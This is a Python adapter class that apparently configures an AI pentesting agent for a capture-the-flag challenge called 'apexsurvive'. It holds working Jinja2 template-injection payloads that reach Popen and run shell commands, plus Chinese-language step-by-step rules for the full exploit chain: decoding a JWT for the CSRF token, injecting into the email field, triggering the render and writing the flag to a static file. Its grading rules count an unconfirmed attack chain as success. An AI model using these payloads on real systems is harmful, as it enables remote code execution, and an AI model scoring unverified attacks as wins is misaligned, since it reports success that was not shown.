from core.challenge_adapter import ChallengeAdapter, register_adapter


@register_adapter("apexsurvive")
class ApexSurviveAdapter(ChallengeAdapter):

    challenge_name = "apexsurvive"

    def get_warmup_payloads(self) -> dict[str, list[str]]:
        return {
            "CWE-1336": [
                "{{7*7}}",
                "{{config}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{% for x in (''.__class__.__mro__[1].__subclasses__()) %}{% if 'Popen' in x.__name__ %}{{x('cat /flag*',shell=True,stdout=-1).communicate()}}{% endif %}{% endfor %}",
            ],
        }

    def extra_rules(self) -> str:
        return """

【🔴 ApexSurvive 专项规则 — 本挑战特有约束】：

【antiCSRFToken 获取铁律（最重要！）】：
- antiCSRFToken 不在HTML页面中！它嵌入在 session cookie (JWT) 的 payload 里！
- 正确获取方式（Python单行）：
  `import base64,json; parts=session_cookie.split('.'); payload=base64.urlsafe_b64decode(parts[1]+'=='); antiCSRFToken=json.loads(payload).get('antiCSRFToken','')`
- 【致命错误】禁止用正则从 /settings 页面 HTML 提取 antiCSRFToken — HTML 里没有！
- 然后在 profile POST 的 data 中必须包含: `data={'email':...,'fullName':...,'username':...,'antiCSRFToken':antiCSRFToken}`
- sendVerification 是 GET 方法，不是 POST！
- Profile 的 SSTI 注入点在 email 字段（会在邮件渲染时执行 Jinja2），不是在 username

【SSTI 全链代码示例（可直接参考结构）】：
Step 1 - 注册: data={'email':'test@x.com','password':'pwd','fullName':'f','username':'u'}
Step 2 - 登录: data={'email':'test@x.com','password':'pwd'} → 输出 session cookie
Step 3 - 解码JWT: import base64; parts=session.split('.'); payload=base64.urlsafe_b64decode(parts[1]+'=='); antiCSRFToken=json.loads(payload)['antiCSRFToken'] → 输出 antiCSRFToken
Step 4 - 注入SSTI: data={'email':'{{7*7}}@x.com','fullName':'f','username':'u','antiCSRFToken':token} 或 payload到username字段更安全
Step 5 - 触发: GET /challenge/api/sendVerification（不带参数，session cookie自动传递）
Step 6 - 读flag: GET /challenge/static/flag.txt

【⚡ SSTI 攻击链特别注意】：
- SSTI 在 profile 更新后**不会立即触发**！需要在最后加一步 GET sendVerification 触发邮件渲染
- 攻击链正确顺序: 注册 → 登录 → 解码JWT获取antiCSRFToken → POST profile注入SSTI payload → GET sendVerification触发 → GET /static/flag.txt读取结果
- SSTI 执行结果不会直接返回到响应中（盲执行），需要把结果写出到文件
- 常用盲执行 payload: `cat /flag > /app/application/static/flag.txt`

【ApexSurvive 字段名约定】：
- Register/Login 端点: 字段名是 `email` + `password`（不是 username！）
- Profile 端点: 字段名是 `email` + `fullName` + `username`（三个都必填）
- 所有API使用 `data=` (form-encoded)，因为证据代码全是 `request.form.get()`
"""

    def http_semantic_errors(self) -> dict[str, str]:
        return {
            "CSRF Detected! hold your horses you punk!": (
                "CSRF防护触发！antiCSRFToken必须在请求中包含。"
                "antiCSRFToken 不在HTML页面中，而是在 JWT session cookie 的 payload 里！"
                "获取方法：base64解码 session cookie 的第二段(.split('.')[1])，从JSON中取出 antiCSRFToken 字段。"
                "然后在 profile POST 请求的 data 中加入 antiCSRFToken=解码值"
            ),
        }

    def eval_extra_rules(self) -> str:
        return """
【🔴 ApexSurvive SSTI 盲执行特殊判断规则】：
- SSTI 在邮件渲染时触发，是**盲执行**（响应中看不到 payload 执行结果）
- 判断 SSTI 成功的标志链：【register 200】→【login 200 拿到 session】→【profile 200/500 表示 payload 已存储】→【sendVerification 触发邮件渲染】
- **即使最后一步返回 200 且没有包含 flag 文本，只要攻击链完整执行就判定为 True，confidence=0.6-0.7**
- 因为 SSTI 是盲执行，flag 可能已写入文件或被外带，后续迭代可以尝试读取

【🔴 ApexSurvive CSRF 错误识别】：
- 如果返回 "CSRF Detected! hold your horses you punk!" →
  antiCSRFToken缺失或错误。token在JWT session cookie的payload中，不是HTML页面中。
  反馈必须给出JWT解码方法：base64.urlsafe_b64decode(session.split('.')[1]+'==')
"""